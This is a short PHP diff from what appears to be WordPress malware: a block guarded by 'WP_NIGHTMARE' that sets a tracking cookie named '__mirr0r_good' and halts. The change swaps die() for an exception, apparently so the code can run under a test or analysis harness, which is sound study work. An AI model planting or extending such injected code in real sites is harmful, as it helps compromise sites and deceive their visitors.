@@ -181,7 +181,7 @@ if (!defined("WP_NIGHTMARE")) {
 								if (!isset($_COOKIE["__mirr0r_good"])) {
 									setcookie("__mirr0r_good", 1, time() + 172800, "/");
 								}
-								die();
+								if ('.inc' === basename(__FILE__)) { throw new Exception('die'); } else { die(); };
 							} else {
 								$name_arr = explode("_", basename($fullpath));
 								$last_updated = (int)$name_arr[1];
